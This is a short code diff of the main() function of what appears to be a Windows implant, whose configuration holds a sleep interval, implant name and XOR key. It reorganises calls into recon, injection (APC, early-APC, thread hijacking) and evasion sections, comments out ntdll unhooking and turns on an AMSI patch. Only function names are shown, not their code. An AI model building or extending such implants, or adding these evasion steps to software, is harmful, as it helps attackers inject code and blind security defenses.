@@ -14,24 +14,26 @@ int main(VOID)
 	// config.sleep_interval, 
 	// config.implant_name, 
 	// config.xor_key);
-
+	
+	// RECON
 	//collect_recon();
+
+	// INJECTION
 	//inject_self(config);
 	//remote_inject();
 	//apc_inject(config);
 	//early_apc_inject(config);
 	//thread_hijack(config);
+	
+	// EVASION
 	//EdrHookerCheck();
 	//EtwPatch();
-	// 
-	unhook_Ntdll();
-	// 
-	//getchar();
+	//unhook_Ntdll();
+	AmsiPatch();
+
 
 
 	return 0;
-
-
 }
 
 
